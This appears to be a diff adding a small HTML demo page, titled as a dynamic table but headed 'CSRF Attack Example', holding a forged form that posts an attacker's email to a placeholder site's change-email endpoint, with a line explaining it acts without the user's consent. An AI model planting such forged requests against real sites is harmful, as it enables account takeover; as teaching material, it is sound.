@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Dynamic Table - CSRF Example</title>
+</head>
+
+<body>
+  <div class="container">
+    <h3>CSRF Attack Example</h3>
+
+    <!-- CSRF Form -->
+    <form id="csrfForm" action="https://vulnerable-website.com/change-email" method="POST">
+      <!-- Hidden fields containing the forged request data -->
+      <input type="hidden" name="email" value="attacker@example.com">
+      <!-- CSRF Token (if used by the server) -->
+      <input type="hidden" name="csrf_token" value="csrf_token_value">
+      <!-- Submit button -->
+      <button type="submit">Change Email</button>
+    </form>
+
+    <!-- Explanation -->
+    <p>This form will submit a request to change the user's email address to <strong>attacker@example.com</strong> on the vulnerable website without their consent.</p>
+  </div>
+
+  <!-- Bootstrap JS and dependencies -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.29.1/moment.min.js"></script>
+  <script src="./src/scripts/DynamicTable.js"></script>
+</body>
+</html>
